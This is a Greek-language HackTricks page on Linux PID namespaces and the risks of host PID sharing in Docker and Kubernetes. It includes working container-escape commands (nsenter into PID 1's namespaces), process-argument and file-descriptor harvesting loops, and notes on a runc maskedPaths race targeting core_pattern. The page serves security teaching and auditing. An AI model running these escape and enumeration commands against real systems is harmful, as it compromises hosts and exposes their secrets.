# PID Namespace

{{#include ../../../../../banners/hacktricks-training.md}}

## Επισκόπηση

Το PID namespace ελέγχει πώς αριθμούνται οι διεργασίες και ποιες διεργασίες είναι ορατές. Γι' αυτό ένα container μπορεί να έχει το δικό του PID 1 παρότι δεν είναι πραγματική μηχανή. Μέσα στο namespace, το workload βλέπει αυτό που φαίνεται να είναι ένα τοπικό δέντρο διεργασιών. Έξω από το namespace, ο host εξακολουθεί να βλέπει τα πραγματικά host PIDs και το πλήρες τοπίο διεργασιών.

Από άποψη ασφάλειας, το PID namespace έχει σημασία επειδή η ορατότητα διεργασιών είναι πολύτιμη. Μόλις ένα workload μπορεί να δει διεργασίες του host, ενδέχεται να μπορεί να παρατηρήσει ονόματα υπηρεσιών, arguments γραμμής εντολών, secrets που περνάνε σε arguments διεργασιών, κατάσταση που προέρχεται από το περιβάλλον μέσω του `/proc`, και πιθανούς στόχους εισόδου σε namespace. Αν μπορεί να κάνει περισσότερα από το να βλέπει απλώς αυτές τις διεργασίες — για παράδειγμα στέλνοντας σήματα ή χρησιμοποιώντας ptrace υπό κατάλληλες συνθήκες — το πρόβλημα γίνεται πολύ πιο σοβαρό.

## Λειτουργία

Ένας νέος PID namespace ξεκινάει με τη δική του εσωτερική αρίθμηση διεργασιών. Η πρώτη διεργασία που δημιουργείται μέσα σε αυτό γίνεται PID 1 από την οπτική του namespace, κάτι που σημαίνει επίσης ότι αποκτά ειδική συμπεριφορά τύπου init για ορφανά παιδιά και για τη διαχείριση σημάτων. Αυτό εξηγεί πολλές ιδιομορφίες των container γύρω από τις init διεργασίες, την αποκομιδή των zombie διεργασιών, και γιατί μικρά init wrappers χρησιμοποιούνται κάποιες φορές σε containers.

Το σημαντικό μάθημα ασφαλείας είναι ότι μια διεργασία μπορεί να φαίνεται απομονωμένη επειδή βλέπει μόνο το δικό της δέντρο PID, αλλά αυτή η απομόνωση μπορεί να αφαιρεθεί σκόπιμα. Docker το εκθέτει αυτό μέσω `--pid=host`, ενώ Kubernetes το κάνει μέσω `hostPID: true`. Μόλις το container ενταχθεί στο host PID namespace, το workload βλέπει απευθείας τις διεργασίες του host, και πολλοί επακόλουθοι δρόμοι επίθεσης γίνονται πολύ πιο ρεαλιστικοί.

## Εργαστήριο

Για να δημιουργήσετε χειροκίνητα ένα PID namespace:
```bash
sudo unshare --pid --fork --mount-proc bash
ps -ef
echo $$
```
Το shell τώρα βλέπει μια ιδιωτική προβολή διεργασιών. Το flag `--mount-proc` είναι σημαντικό επειδή προσαρτά ένα procfs instance που ταιριάζει με το νέο PID namespace, καθιστώντας τη λίστα διεργασιών συνεπή από το εσωτερικό.

Για να συγκρίνετε τη συμπεριφορά του container:
```bash
docker run --rm debian:stable-slim ps -ef
docker run --rm --pid=host debian:stable-slim ps -ef | head
```
Η διαφορά είναι άμεση και εύκολη στην κατανόηση, γι' αυτό αυτό είναι ένα καλό πρώτο εργαστήριο για τους αναγνώστες.

## Χρήση κατά την εκτέλεση

Τα συνηθισμένα containers σε Docker, Podman, containerd και CRI-O αποκτούν το δικό τους PID namespace. Τα Kubernetes Pods συνήθως λαμβάνουν επίσης μια απομονωμένη προβολή PID, εκτός αν το workload ζητήσει ρητά host PID sharing. Τα περιβάλλοντα LXC/Incus βασίζονται στον ίδιο kernel primitive, αν και οι περιπτώσεις χρήσης system-container μπορεί να εκθέσουν πιο πολύπλοκα δέντρα διεργασιών και να ενθαρρύνουν συντομεύσεις για debugging.

Ο ίδιος κανόνας ισχύει παντού: εάν το runtime επέλεξε να μην απομονώσει το PID namespace, αυτό είναι μια σκόπιμη μείωση των ορίων του container.

## Λανθασμένες ρυθμίσεις

Το κλασικό λάθος ρύθμισης είναι το host PID sharing. Οι ομάδες συχνά το αιτιολογούν για debugging, monitoring ή ευκολία στη διαχείριση υπηρεσιών, αλλά πρέπει πάντα να αντιμετωπίζεται ως σημαντική εξαίρεση ασφαλείας. Ακόμα και αν το container δεν έχει άμεσο write primitive στις διεργασίες του host, η ίδια η ορατότητα μπορεί να αποκαλύψει πολλά για το σύστημα. Μόλις προστεθούν capabilities όπως `CAP_SYS_PTRACE` ή χρήσιμη πρόσβαση στο procfs, ο κίνδυνος αυξάνεται σημαντικά.

Ένα ακόμη λάθος είναι να υποθέτεις ότι επειδή το workload δεν μπορεί να σκοτώσει ή να ptrace τις διεργασίες του host από προεπιλογή, το host PID sharing είναι αβλαβές. Αυτό το συμπέρασμα αγνοεί την αξία της enumeration, τη διαθεσιμότητα στόχων για namespace-entry, και τον τρόπο που η ορατότητα PID συνδυάζεται με άλλα εξασθενημένα controls.

## Κατάχρηση

Εάν το host PID namespace είναι κοινό, ένας επιτιθέμενος μπορεί να εξετάσει τις διεργασίες του host, να συλλέξει τα arguments διεργασιών, να εντοπίσει ενδιαφέρουσες υπηρεσίες, να βρει υποψήφια PIDs για `nsenter`, ή να συνδυάσει την ορατότητα διεργασιών με προνόμιο σχετικό με ptrace για να επηρεάσει τον host ή γειτονικά workloads. Σε ορισμένες περιπτώσεις, απλώς η εμφάνιση της σωστής μακροχρόνιας διεργασίας είναι αρκετή για να αναδιαμορφώσει το υπόλοιπο σχέδιο επίθεσης.

Το πρώτο πρακτικό βήμα είναι πάντα να επιβεβαιώσετε ότι οι διεργασίες του host είναι πραγματικά ορατές:
```bash
readlink /proc/self/ns/pid
ps -ef | head -n 50
ls /proc | grep '^[0-9]' | head -n 20
```
Μόλις host PIDs είναι ορατά, τα process arguments και οι namespace-entry targets συχνά γίνονται η πιο χρήσιμη πηγή πληροφοριών:
```bash
for p in 1 $(pgrep -n systemd 2>/dev/null) $(pgrep -n dockerd 2>/dev/null); do
echo "PID=$p"
tr '\0' ' ' < /proc/$p/cmdline 2>/dev/null; echo
done
```
Εάν το `nsenter` είναι διαθέσιμο και υπάρχουν επαρκή προνόμια, δοκιμάστε εάν μια ορατή host process μπορεί να χρησιμοποιηθεί ως namespace bridge:
```bash
which nsenter
nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "nsenter blocked"
```
Ακόμα κι αν η είσοδος είναι μπλοκαρισμένη, το host PID sharing είναι ήδη πολύτιμο γιατί αποκαλύπτει τη διάταξη των υπηρεσιών, τα runtime components και υποψήφιες privileged διαδικασίες για επόμενο στόχο.

Η Host PID visibility επίσης κάνει την κατάχρηση file-descriptor πιο ρεαλιστική. Αν μια privileged host process ή γειτονικό workload έχει ανοιχτό ένα ευαίσθητο αρχείο ή socket, ο attacker μπορεί να μπορεί να ελέγξει το `/proc/<pid>/fd/` και να επαναχρησιμοποιήσει εκείνο το handle ανάλογα με την ιδιοκτησία, τις procfs mount options και το target service model.
```bash
for fd_dir in /proc/[0-9]*/fd; do
ls -l "$fd_dir" 2>/dev/null | sed "s|^|$fd_dir -> |"
done
grep " /proc " /proc/mounts
```
Αυτές οι εντολές είναι χρήσιμες επειδή απαντούν στο αν το `hidepid=1` ή το `hidepid=2` μειώνει την ορατότητα μεταξύ διεργασιών και στο αν προφανώς ενδιαφέροντες περιγραφείς, όπως ανοιχτά αρχεία με μυστικά, αρχεία καταγραφής ή Unix sockets, είναι καθόλου ορατοί.

### Πλήρες Παράδειγμα: host PID + `nsenter`

Ο διαμοιρασμός host PID γίνεται άμεση απόδραση στο host όταν η διεργασία έχει επίσης αρκετά προνόμια για να ενταχθεί στα host namespaces:
```bash
ps -ef | head -n 50
capsh --print | grep cap_sys_admin
nsenter -t 1 -m -u -n -i -p /bin/bash
```
Αν η εντολή εκτελεστεί με επιτυχία, η διαδικασία του container εκτελείται πλέον στα host mount, UTS, network, IPC και PID namespaces. Το αποτέλεσμα είναι άμεση παραβίαση του host.

Ακόμη κι αν το `nsenter` απουσιάζει, το ίδιο αποτέλεσμα μπορεί να επιτευχθεί μέσω του host binary εάν το host filesystem είναι mounted:
```bash
/host/usr/bin/nsenter -t 1 -m -u -n -i -p /host/bin/bash 2>/dev/null
```
### Πρόσφατες Σημειώσεις Εκτέλεσης

Μερικές επιθέσεις που σχετίζονται με το PID-namespace δεν είναι οι παραδοσιακές λανθασμένες ρυθμίσεις `hostPID: true`, αλλά σφάλματα υλοποίησης κατά τον χρόνο εκτέλεσης σχετικά με το πώς εφαρμόζονται οι προστασίες procfs κατά τη ρύθμιση του container.

#### Αγώνας του `maskedPaths` προς το host procfs

Σε ευάλωτες εκδόσεις του `runc`, επιτιθέμενοι που μπορούν να ελέγξουν το container image ή το `runc exec` workload θα μπορούσαν να εκμεταλλευτούν μια race condition στη φάση μάσκας αντικαθιστώντας την πλευρά του container `/dev/null` με ένα symlink σε μια ευαίσθητη procfs διαδρομή όπως `/proc/sys/kernel/core_pattern`. Εάν ο race πετύχαινε, το bind mount του masked-path θα μπορούσε να καταλήξει στον λάθος στόχο και να αποκαλύψει host-global procfs knobs στο νέο container.

Χρήσιμη εντολή για έλεγχο:
```bash
jq '.linux.maskedPaths' config.json 2>/dev/null
```
Αυτό είναι σημαντικό επειδή ο τελικός αντίκτυπος μπορεί να είναι ο ίδιος με άμεση procfs έκθεση: εγγράψιμο `core_pattern` ή `sysrq-trigger`, ακολουθούμενα από host code execution ή denial of service.

#### Namespace injection with `insject`

Τα namespace injection εργαλεία όπως το `insject` δείχνουν ότι η αλληλεπίδραση με PID-namespace δεν απαιτεί πάντα την προ-είσοδο στο target namespace πριν από τη δημιουργία της διαδικασίας. Ένας helper μπορεί να επισυναφθεί αργότερα, να χρησιμοποιήσει `setns()`, και να εκτελέσει διατηρώντας την ορατότητα στον target PID space:
```bash
sudo insject -S -p $(pidof containerd-shim) -- bash -lc 'readlink /proc/self/ns/pid && ps -ef'
```
Αυτό το είδος τεχνικής έχει σημασία κυρίως για advanced debugging, offensive tooling και post-exploitation workflows όπου το namespace context πρέπει να ενωθεί αφού το runtime έχει ήδη αρχικοποιήσει το workload.

### Related FD Abuse Patterns

Υπάρχουν δύο μοτίβα που αξίζουν να επισημανθούν ρητά όταν τα host PIDs είναι ορατά. Πρώτον, μια privileged process μπορεί να κρατήσει έναν sensitive file descriptor ανοιχτό κατά τη διάρκεια του `execve()` επειδή δεν είχε επισημανθεί με `O_CLOEXEC`. Δεύτερον, services μπορεί να περάσουν file descriptors μέσω Unix sockets με `SCM_RIGHTS`. Σε αμφότερες τις περιπτώσεις, το ενδιαφέρον αντικείμενο δεν είναι πλέον το pathname, αλλά το ήδη ανοιχτό handle που μια lower-privilege process μπορεί να κληρονομήσει ή να λάβει.

Αυτό είναι κρίσιμο στο container work γιατί το handle μπορεί να δείχνει στο `docker.sock`, ένα privileged log, ένα host secret file ή κάποιο άλλο high-value αντικείμενο ακόμα κι αν το path δεν είναι απευθείας προσβάσιμο από το container filesystem.

## Checks

Ο σκοπός αυτών των εντολών είναι να καθορίσουν αν η process έχει ιδιωτική PID view ή αν μπορεί ήδη να απαριθμήσει ένα πολύ ευρύτερο process landscape.
```bash
readlink /proc/self/ns/pid   # PID namespace identifier
ps -ef | head                # Quick process list sample
ls /proc | head              # Process IDs and procfs layout
```
Τι είναι ενδιαφέρον εδώ:

- Αν η λίστα διεργασιών περιέχει προφανείς υπηρεσίες του host, το host PID sharing πιθανότατα είναι ήδη σε ισχύ.
- Η εμφάνιση μόνο ενός μικρού container-local δέντρου είναι το φυσιολογικό baseline· η εμφάνιση των `systemd`, `dockerd` ή άσχετων daemons δεν είναι.
- Μόλις τα host PIDs είναι ορατά, ακόμη και οι μόνο για ανάγνωση πληροφορίες διεργασιών γίνονται χρήσιμη αναγνώριση.

Αν ανακαλύψετε ένα container που τρέχει με host PID sharing, μην το θεωρήσετε απλή αισθητική διαφορά. Πρόκειται για σημαντική αλλαγή σε ό,τι μπορεί να παρατηρήσει και ενδεχομένως να επηρεάσει το workload.
